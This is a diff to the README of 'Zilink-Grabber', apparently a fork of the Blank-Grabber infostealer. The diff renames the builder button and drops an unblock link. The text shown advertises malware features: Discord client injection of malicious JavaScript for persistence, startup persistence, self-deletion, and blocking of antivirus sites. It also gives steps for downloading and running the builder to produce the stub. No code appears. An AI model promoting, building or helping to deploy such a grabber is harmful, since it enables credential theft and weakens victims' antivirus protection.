@@ -72,7 +72,7 @@
 | **Startup** | Runs the stub on Windows starup. |
 | **Delete Self** | Deletes the grabber after use. |
 | **Discord Injection** | Adds malicious Javascript code to the Discord client for persistence. |
-| **Block AV Sites** | Blocks AV related sites ([Unblock](https://github.com/Blank-c/Blank-Grabber/issues/117)). |
+| **Block AV Sites** | Blocks AV related sites . |
 | **Message Box** | Create custom message box. |
 
 **Supports:** *Windows OS (Tested on Windows 10).*
@@ -91,7 +91,7 @@
 3. [Download Zilink-Grabber](#download).
 4. [Extract](https://www.pcworld.com/article/394871/how-to-unzip-files-in-windows-10.html#:~:text=Unzip%20all%20files%20in%20a%20ZIP%20file) the zip file.
 5. And double click *Builder.exe* file.
-6. Fill in the fields of the builder and press the <kbd>Build</kbd> button.
+6. Fill in the fields of the builder and press the <kbd>Setup</kbd> button.
 
 
 ## To-Do/Enhancements
